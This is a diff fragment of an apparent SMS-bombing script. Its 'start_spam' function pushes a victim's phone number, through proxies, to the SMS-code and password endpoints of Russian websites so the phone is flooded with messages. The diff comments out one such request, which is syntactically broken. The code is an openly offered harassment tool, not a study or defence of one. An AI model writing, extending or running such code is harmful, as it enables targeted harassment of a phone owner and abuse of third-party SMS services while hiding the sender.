@@ -684,11 +684,11 @@ def start_spam(phone, proxies):
             post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"}, headers=headers, proxies=proxies)
         except:
             pass
-        try:
-            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
-            post("https://cinema5.ru/api/phone_code", data={"phone": self.phone}, headers=headers_copy))    
-	except:
-            pass
+#        try:
+#           formatted_phone = format_phone(phone, "+# (###) ###-##-##")
+#           post("https://cinema5.ru/api/phone_code", data={"phone": self.phone}, headers=headers_copy))    
+#	except:
+#           pass
 	   
 
 # Тестовые сервисы. Версия 0.0.2
